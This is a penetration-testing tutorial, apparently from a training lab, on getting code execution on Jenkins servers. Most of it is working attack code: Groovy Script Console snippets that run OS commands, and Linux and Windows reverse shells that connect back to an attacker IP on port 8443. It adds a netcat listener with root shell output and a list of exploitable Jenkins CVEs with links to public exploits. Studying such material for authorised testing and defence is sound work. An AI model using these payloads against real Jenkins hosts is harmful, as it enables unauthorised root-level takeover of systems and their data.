# Attacking Jenkins

With admin access confirmed on a Jenkins instance, the fastest path to code execution is the Script Console. Jenkins frequently runs as `root` on Linux or `SYSTEM` on Windows, so a shell from Jenkins is almost always a maximum-privilege shell on the host.

***

## Script Console RCE

The Jenkins Script Console is available at `/script` and accepts [Apache Groovy](https://groovy-lang.org/) code, which compiles to Java bytecode and runs directly in the Jenkins controller JVM.  This gives you the ability to execute operating system commands without any additional tooling. 

Navigate to:

```
http://jenkins.inlanefreight.local:8000/script
```

### Basic Command Execution

Use this snippet to run a single OS command and print the output:

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

### Linux Reverse Shell

Replace the IP and port with your listener before running:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Set up a listener before executing:

```bash
nc -lvnp 8443
```

```
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

uid=0(root) gid=0(root) groups=0(root)
```

### Windows Command Execution

For Windows targets, use `cmd.exe` inside the Groovy snippet:

```groovy
def cmd = "cmd.exe /c whoami".execute();
println("${cmd.text}");
```

### Windows Reverse Shell

Swap `localhost` and the port for your attacker IP and listener port:

```groovy
String host="10.10.14.15";
int port=8443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();Thread.sleep(50);
    try{p.exitValue();break;}catch(Exception e){}
};
p.destroy();s.close();
```

The [jenkins_script_console](https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/) Metasploit module automates this when you have valid credentials or an API token, handling CSRF token extraction and payload delivery. 

***

## Known RCE Vulnerabilities

### CVE-2018-1999002 + CVE-2019-1003000: Pre-Auth RCE

These two CVEs are chained for unauthenticated code execution, bypassing the Groovy script sandbox during compilation.  The attack exploits Jenkins dynamic routing to reach the `checkScriptCompile` endpoint without authentication, then abuses AST transformation annotations to execute a malicious JAR file hosted on an attacker-controlled server.  The PoC is available on [Exploit-DB](https://www.exploit-db.com/exploits/46453) and targets: 

- Script Security Plugin 1.49 and earlier
- Pipeline: Declarative Plugin 1.3.4 and earlier
- Pipeline: Groovy Plugin 2.61 and earlier

This vulnerability affects Jenkins version 2.137 and was patched in the [January 2019 security advisory](https://www.jenkins.io/security/advisory/2019-01-08/). 

### Jenkins 2.150.2: Authenticated RCE via Node.js

Users with job creation and build permissions can execute code on the Jenkins server through a Node.js pipeline step. If anonymous access is enabled on the instance, this becomes unauthenticated since anonymous users receive these permissions by default.

### CVE-2024-23897: Unauthenticated File Read

An [args4j CLI parser flaw](https://nvd.nist.gov/vuln/detail/CVE-2024-23897) in Jenkins versions up to 2.441 misinterprets `@` prefixed arguments as file read directives. Unauthenticated users can read the first few lines of any file on the controller, while authenticated users can read files in full. This has been used as a stepping stone to full RCE and was actively exploited in ransomware campaigns in 2024. 

***

## Vulnerability Reference

| CVE | Type | Auth Required | Affected Versions |
|---|---|---|---|
| CVE-2018-1999002 | Path traversal | No | Jenkins 2.137 |
| CVE-2019-1003000 | Sandbox bypass / RCE | No | Script Security Plugin 1.49 and earlier |
| Jenkins 2.150.2 flaw | RCE via Node.js | Yes (or anon) | Jenkins 2.150.2 |
| CVE-2024-23897 | Arbitrary file read / RCE chain | No | Jenkins up to 2.441 |

> Jenkins is one of the most reliable and rewarding targets during internal penetration tests. Whenever you confirm an instance, check for the Script Console first and test default credentials before moving on to vulnerability-specific exploitation.
